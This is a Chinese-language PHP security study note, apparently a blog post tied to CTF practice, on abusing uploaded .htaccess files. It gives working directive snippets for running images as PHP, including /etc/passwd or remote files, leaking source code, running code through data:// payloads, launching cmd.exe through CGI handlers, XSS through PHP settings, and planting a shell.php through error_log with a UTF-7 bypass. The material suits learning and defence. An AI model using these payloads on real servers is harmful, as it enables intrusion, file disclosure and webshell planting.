# PHP安全学习—htaccess

Author: H3rmesk1t

Data: 2021.05.08

# 文件解析

> 经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行
>.htaccess 文件内容有如下两种

```php
(1)SetHandler 指令

# 将images.png 当做 PHP 执行
<FilesMatch  "images.png">
SetHandler  application/x-httpd-php
</FilesMatch>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508200510679.png#pic_center)

```php
(2)AddType

# 将 .jpg(.xxx) 当做 PHP 文件解析
AddType application/x-httpd-php .jpg(.xxx)
```
# 文件包含

> 本地文件包含
> 通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件，同时在本目录或子目录中需要有可解析的 php 文件来触发
>.htaccess 分别通过这两个配置选项来包含 /etc/passwd，并访问同目录下的 index.php文件

```php
auto_prepend_file

php_value auto_prepend_file /etc/passwd
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508200805649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
auto_append_file

php_value auto_append_file /etc/passwd
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508200840738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

> 远程文件包含
> PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启

```php
php_value auto_append_file http://10.87.9.156/phpinfo.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508201049583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 源码泄露
> 利用 php_flag 将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露

```php
php_flag engine 0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508201211904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 代码执行
> （1）利用伪协议
all_url_fopen、all_url_include 为 On
> （2）解析.htaccess

```php
（1）
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508202342125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
（2.1）
php_value auto_append_file .htaccess
#<?php phpinfo();
（2.2）
这种适合同目录或子目录没有 php 文件。
需要先设置允许可访问 .htaccess 文件

Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>

将 .htaccess指定当做 php文件处理

SetHandler application/x-httpd-php
# <?php phpinfo(); ?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508202453546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508202507264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 命令执行

> CGI启动

```php
cgi_module 需要加载，即 apache 配置文件中有

LoadModule cgi_module modules/mod_cgi.so
.htaccess内容

Options ExecCGI #允许CGI执行
AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析
ce.xx

#!C:/Windows/System32/cmd.exe /k start calc.exe
6
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508202654764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
[参考例题](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check%20in)

> FastCGI启动

```php
mod_fcgid.so需要被加载。即 apache 配置文件中有

LoadModule fcgid_module modules/mod_fcgid.so
.htaccess

Options +ExecCGI
AddHandler fcgid-script .xx
FcgidWrapper "C:/Windows/System32/cmd.exe /k start calc.exe" .xx

ce.xx 内容随意
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508202946968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# XSS

> highlight_file

```php
.htaccess
php_value highlight.comment '"><script>alert(1);</script>'

index.php
<?php
highlight_file(__FILE__);
// comment

其中的 highlight.comment 也可以换成如下其他选项
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508203146944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

> 错误消息链接

```php
index.php ：
<?php
include('foo');#foo报错

.htaccess
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508203246789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 自定义错误文件

```php
error.php
<?php include('shell');#报错页面

.htaccess
php_value error_log /tmp/www/html/shell.php 
php_value include_path "<?php phpinfo(); __halt_compiler();"

访问 error.php，会报错并记录在 shell.php 文件中
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210508203403849.png#pic_center)

```php
因为会经过 html 编码，所以需要 UTF-7 来绕过。

.htaccess

# 第一次
php_value error_log /tmp/shell #定义错误路径
#---- "<?php phpinfo(); __halt_compiler();" in UTF-7:
php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"

# 第二次
php_value include_path "/tmp" #将include()的默认路径改变
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```
[参考例题](https://www.cnblogs.com/tr1ple/p/11439994.html)